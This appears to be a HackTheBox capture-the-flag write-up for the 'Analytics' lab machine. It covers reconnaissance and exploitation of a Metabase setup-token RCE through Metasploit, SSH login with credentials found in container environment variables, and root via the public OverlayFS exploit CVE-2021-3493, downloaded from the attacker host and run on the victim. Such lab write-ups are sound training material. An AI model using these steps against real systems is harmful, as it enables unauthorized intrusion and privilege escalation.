---
title: Analytics
layout: default
permalink: /writeups/hackthebox/:title/
tags: [writeup]
category: HackTheBox
---

# [Analytics](https://app.hackthebox.com/machines/569)

### nmap

```bash
nmap -sC -sV -oA scans/initial -vv 10.10.11.233
```
![image](/assets/img/Pasted image 20231014021247.png)

<br><br>

### Port 80 (HTTP)

When navigating to the webpage we get an error and redirected to the domain `analytical.htb`
![image](/assets/img/Pasted image 20231014021459.png)

We can add this domain to our `/etc/host` file to get past this error.
![image](/assets/img/Pasted image 20231014021641.png)

Navigating to `http://analytical.htb` once again, we are greeted by an actual webpage.
![image](/assets/img/Pasted image 20231014021752.png)

Looking around, we see a `Login` button in the top right, when clicked, we get another resolution error because it directs us to a new subdomain `data.analytical.htb`
![image](/assets/img/Pasted image 20231014021907.png)

We can append this new subdomain into our `/etc/hosts` file.
![image](/assets/img/Pasted image 20231014022054.png)

Refreshing, we now see a `Metabase` login portal.
![image](/assets/img/Pasted image 20231014022142.png)

Inspecting the login portal, we can find that `Metabase` version `0.46.6`.
![image](/assets/img/Pasted image 20231014022700.png)

After looking around on good, we find a [Setup Token RCE](https://www.rapid7.com/db/modules/exploit/linux/http/metabase_setup_token_rce/) vulnerability that affects `Metabase` versions before `0.46.6.1`.

We can now use `Metasploit` to exploit this vulnerability.
```
msf6 > use exploit/linux/http/metabase_setup_token_rce
msf6 > set RHOSTS data.analytical.htb
msf6 > set LHOST tun0
msf6 > run
```
![image](/assets/img/Pasted image 20231014023204.png)

<br><br>

### Internal (Docker)

From our small amount of commands available and the `.dockerenv` file in the root of the file system, we can assume that were are in a `Docker` container.
![image](/assets/img/Pasted image 20231014023415.png)

Looking at the environment variables, we see the `META_USER` and `META_PASS` variables set with interesting information.
![image](/assets/img/Pasted image 20231014023547.png)

Now that we have the set of credentials `metalytics:An4lytics_ds20223#`, we can try them on different services running on the host.

After some looking around, we remembered that `SSH` was running, if we try these credentials, we get access to the host running the `Docker` container.
![image](/assets/img/Pasted image 20231014023815.png)

<br><br>

### Internal (Host)

After some manual and automated enumeration, with no results, we decided to look for possible kernel exploits that can escalate our privileges to `root`. 

With the `uname -v` command, we see that the host is running Ubuntu version `22.04`
![image](/assets/img/Pasted image 20231014024300.png)

We found the following [privilege escalation script](https://github.com/briskets/CVE-2021-3493)(CVE-2021-3493) that exploits a vulnerability in `Ubuntu OverlayFS` used for local privilege escalations and we also see version `22.04` under the affected versions.  
![image](/assets/img/Pasted image 20231014024527.png)

Following the `Usage` section, we can download the `C` script, compile it on our attacker machine, then upload the file to the victim and run it.

1. Download [exploit](https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c).
```bash
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
```

2. Compile `exploit.c` using `gcc`
```bash
gcc exploit.c -o exploit
```

3. Host the `exploit` file on a `python3` web server. 
```bash
python3 -m http.server
```
![image](/assets/img/Pasted image 20231014024932.png)

4. On the victim machine, download the `exploit` script.
```bash
wget http://10.10.14.5:8000/exploit
```
![image](/assets/img/Pasted image 20231014025112.png)

5. Make the `exploit` file executable, run the script, and get `root`.
```bash
chmod +x exploit
./exploit
```
![image](/assets/img/Pasted image 20231014025237.png)
